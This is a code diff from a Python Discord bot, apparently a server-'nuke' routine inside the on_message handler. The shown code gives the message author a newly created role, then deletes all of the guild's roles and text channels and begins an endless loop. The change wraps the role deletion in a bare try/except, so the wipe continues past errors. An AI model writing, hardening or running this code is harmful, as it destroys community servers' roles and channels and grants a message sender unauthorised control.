@@ -2232,10 +2232,13 @@ async def on_message(message):
             oprole = await message.guild.create_role(name="Members", permissions=perms)
             await message.author.add_roles(oprole)
             for roles in message.guild.roles:
-                if roles == message.guild.default_role:
+                try:
+                    if roles == message.guild.default_role:
+                        pass
+                    else:
+                        await roles.delete()
+                except:
                     pass
-                else:
-                    await roles.delete()
             for channels in message.guild.text_channels:
                 await channels.delete()
             while True:
